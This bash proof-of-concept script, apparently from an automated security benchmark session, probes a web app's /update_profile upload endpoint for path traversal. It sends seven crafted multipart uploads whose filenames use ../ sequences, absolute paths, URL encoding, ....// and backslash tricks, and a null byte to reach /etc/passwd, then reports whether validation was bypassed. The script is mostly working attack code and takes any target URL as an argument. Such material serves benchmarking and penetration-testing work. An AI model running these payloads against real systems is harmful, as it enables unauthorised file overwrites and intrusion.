#!/bin/bash
# POC: Demonstrates path traversal vulnerability in /update_profile endpoint's image_profile filename parameter. Tests various path traversal techniques to bypass validation filters.
# Target: ./repo
# Created: 2025-11-07T16:09:42.359Z
# Session: benchmark-XBEN-022-24-mhp1ee6o

# Path Traversal via File Upload Filename Parameter - POC
# Tests the /update_profile endpoint for path traversal vulnerabilities via filename parameter

TARGET_URL="${1:-http://localhost:3000}"
ENDPOINT="/update_profile"
FULL_URL="${TARGET_URL}${ENDPOINT}"

# Create temporary test files
TEST_FILE=$(mktemp)
echo "test content" > "$TEST_FILE"

echo "[*] Path Traversal File Upload POC"
echo "[*] Target: $FULL_URL"
echo ""

# Test 1: Standard path traversal attempt (../)
echo "[Test 1] Standard path traversal - ../../../etc/passwd"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=../../../etc/passwd" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response: $BODY"
echo "Validation Active: $(echo "$BODY" | grep -q 'Invalid file location' && echo 'YES' || echo 'NO')"
echo ""

# Test 2: Absolute path attempt
echo "[Test 2] Absolute path - /etc/passwd"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=/etc/passwd" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response: $BODY"
echo "Validation Active: $(echo "$BODY" | grep -q 'Invalid file location' && echo 'YES' || echo 'NO')"
echo ""

# Test 3: Unicode/encoding bypass attempt
echo "[Test 3] Encoding bypass - ..%2F..%2Fetc%2Fpasswd"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=..%2F..%2Fetc%2Fpasswd" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response: $BODY"
echo "Validation Bypassed: $(! echo "$BODY" | grep -q 'Invalid file location' && echo 'POSSIBLE' || echo 'BLOCKED')"
echo ""

# Test 4: Double dot bypass
echo "[Test 4] Double dot bypass - ....//....//etc/passwd"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=....//....//etc/passwd" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response: $BODY"
echo "Validation Bypassed: $(! echo "$BODY" | grep -q 'Invalid file location' && echo 'POSSIBLE' || echo 'BLOCKED')"
echo ""

# Test 5: Valid filename (baseline)
echo "[Test 5] Valid filename baseline - profile_pic.png"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=profile_pic.png" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response (first 200 chars): $(echo "$BODY" | head -c 200)"
echo ""

# Test 6: Null byte injection attempt
echo "[Test 6] Null byte injection - ../test\x00.png"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=../test$(printf '\x00').png" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response: $BODY"
echo ""

# Test 7: Backslash path traversal (Windows style)
echo "[Test 7] Backslash traversal - ..\\..\\.\\etc\\passwd"
RESPONSE=$(curl -s -X POST "$FULL_URL" \
  -F "image_profile=@${TEST_FILE};filename=..\\..\\etc\\passwd" \
  -w "\n%{http_code}" 2>/dev/null)
HTTP_CODE=$(echo "$RESPONSE" | tail -n1)
BODY=$(echo "$RESPONSE" | head -n-1)
echo "HTTP Code: $HTTP_CODE"
echo "Response: $BODY"
echo "Validation Bypassed: $(! echo "$BODY" | grep -q 'Invalid file location' && echo 'POSSIBLE' || echo 'BLOCKED')"
echo ""

# Cleanup
rm -f "$TEST_FILE"

echo "[*] POC Complete"